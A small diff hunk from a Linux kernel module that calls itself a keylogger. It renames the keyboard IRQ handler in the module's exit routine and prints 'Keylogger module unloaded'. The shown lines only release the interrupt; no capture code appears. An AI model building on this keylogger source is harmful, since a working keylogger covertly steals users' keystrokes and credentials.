@@ -37,7 +37,7 @@ static int __init custom_init(void) {
 
 /* Module cleanup */
 static void __exit custom_exit(void) {
-    free_irq(KEYBOARD_IRQ, (void *)(keyboard_irq_handler));
+    free_irq(KEYBOARD_IRQ, (void *)(kloggg_kbd_irq_handler));
     printk(KERN_INFO "Keylogger module unloaded\n");
 }
 
